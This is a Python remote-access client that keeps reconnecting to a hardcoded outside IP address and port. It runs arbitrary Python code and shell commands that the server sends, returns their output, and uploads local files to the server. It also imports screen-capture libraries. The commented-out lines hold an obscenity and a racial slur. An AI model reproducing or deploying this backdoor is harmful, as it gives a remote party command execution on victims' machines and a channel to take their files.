import socket
import re
import threading
import time
import subprocess
import mss
import PIL.Image
import PIL.ImageGrab
import numpy as np
import cv2


class Client:
	def __init__(self, server_ip: str, port: int) -> None:
		self.server_ip = server_ip
		self.port = port
		threading.Thread(target=self.connection).start()

	def connection(self) -> None:
		while True:
			try:
				self.client.send(b"0")
				req = self.client.recv(1024)
				if len(req) > 2:
					data = req.decode()
					if data.startswith("0"):
						data = data[1:]

					if data.split("|")[0] == "EXEC":
						exec(data[5:])

					if data.split("|")[0] == "CMD":
						output, err = subprocess.Popen(data[4:].split(" "), stdout=subprocess.PIPE, shell=True, text=True, stderr=subprocess.PIPE).communicate()
						if not output and not err:
							self.send(f"CMDError")
						self.send(f"CMD{output or err}")

				time.sleep(0.01)
			except:
				try:
					self.client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
					self.client.connect((self.server_ip, self.port))
				except:
					continue

	def ftp(self, src) -> None:
		with open(src, "rb") as f:
			b_file = f.read()

		self.send("FILE|" + re.split(r'[/\\]', src)[-1])

		bytes_list = [b_file[i:i + 4096] for i in range(0, len(b_file), 4096)]
		[self.send(i, encode=None) for i in bytes_list]

		self.send("END")

	def send(self, text: str, encode="utf-8") -> None:
		if encode:
			self.client.send(text.encode(encode))
		else:
			self.client.send(text)
		return

if __name__ == "__main__":
	# client = Client("26.35.239.192", 7546)
	# client = Client("26.172.116.184", 7546)
	client = Client("212.115.110.10", 7546)
	# client = Client("192.168.1.149", 7546)
	# client.send("хуй")
	# client.tcp("input_files/negr.jpg")
	# client.send("get info")